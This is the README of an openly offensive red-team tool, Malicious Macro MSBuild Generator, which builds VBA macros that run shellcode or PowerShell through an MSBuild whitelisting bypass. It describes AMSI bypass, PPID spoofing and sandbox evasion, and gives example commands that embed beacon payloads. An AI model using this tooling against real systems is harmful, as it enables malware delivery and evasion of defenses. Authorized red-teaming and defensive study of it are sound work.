# Malicious Macro MSBuild Generator v2.1

## Description
Generates Malicious Macro and Execute Powershell or Shellcode via MSBuild Application Whitelisting Bypass, this tool intended for adversary simulation and red teaming purpose.

## Disclaimer
> MaliciousMacroMSBuild should be used for authorized red teaming and/or nonprofit educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

## Changelog
```
Version 2.1
-----------
+ Added sandbox evasion technique using environmental keying domain checking
+ Added Kill Date format dd/mm/yyyy [28/02/2018]
+ Move payload from public user to current user download folder

Version 2.0
-----------
+ Added Option Macro AMSI Bypass (Thanks to outflank team)
+ Added PPID Spoofing {9BA05972-F6A8-11CF-A442-00A0C90A8F39}
+ Added functionality auto removed csproj payload after execution
+ Added custom msbuild option
```

## Usage
```
 /$$      /$$  /$$$$$$   /$$$$$$ 
| $$$    /$$$ /$$__  $$ /$$__  $$
| $$$$  /$$$$|__/  \ $$| $$  \__/
| $$ $$/$$ $$   /$$$$$/| $$ /$$$$
| $$  $$$| $$  |___  $$| $$|_  $$
| $$\  $ | $$ /$$  \ $$| $$  \ $$
| $$ \/  | $$|  $$$$$$/|  $$$$$$/
|__/     |__/ \______/  \______/ 

Malicious Macro MSBuild Generator v2.0
Author : Rahmat Nurfauzi (@infosecn1nja)
   
usage: m3-gen.py [-h] -i INPUTFILE -p PAYLOAD -o OUTPUT [-a] [-d DOMAIN]
                 [-k KILL_DATE]

optional arguments:
  -h, --help            show this help message and exit
  -i INPUTFILE, --inputfile INPUTFILE
                        Input file you want to embed into the macro
  -p PAYLOAD, --payload PAYLOAD
                        Choose a payload for powershell, raw shellcode or custom
  -o OUTPUT, --output OUTPUT
                        Output filename for the macro
  -a, --amsi_bypass     Macro AMSI Bypass Execute via ms office trusted location
  -d DOMAIN, --domain DOMAIN
                         Sandbox evasion technique using environmental keying domain checking. Use comma separating to set multiple domains
  -k KILL_DATE, --kill_date KILL_DATE
                        Set kill date format dd/MM/yyyy the payload do not run on or after this day
```

## Examples
* Choose a payload you want to test like shellcode or powershell, the shellcode support  stageless and staged payload
* Generate a raw shellcode in whatever framework you want (Cobalt Strike, Empire, PoshC2)

### Creation of a Shellcode MSBuild VBA Macro 
`python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba`

### Creation of a PowerShell MSBuild VBA Macro 
`python m3-gen.py -p powershell -i /path/payload.ps1 -o output.vba`

### Creation of a Custom MSBuild VBA Macro 
`python m3-gen.py -p custom -i /path/msbuild.xml -o output.vba`

### Creation of a Shellcode MSBuild VBA Macro With Kill Date
`python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -k 20/03/2018`

### Creation of a Shellcode MSBuild VBA Macro With Environmental Keying
* `python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain`
* `python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, microsoft, github`

## Links
* https://lolbas-project.github.io/lolbas/Binaries/Msbuild/
* https://attack.mitre.org/techniques/T1127/
* https://msdn.microsoft.com/en-us/library/dd722601.aspx

## Author and Credits
Author : Rahmat Nurfauzi - [@infosecn1nja](https://twitter.com/infosecn1nja)  
Credits : [@subTee](https://twitter.com/subtee) - For discovering msbuild technique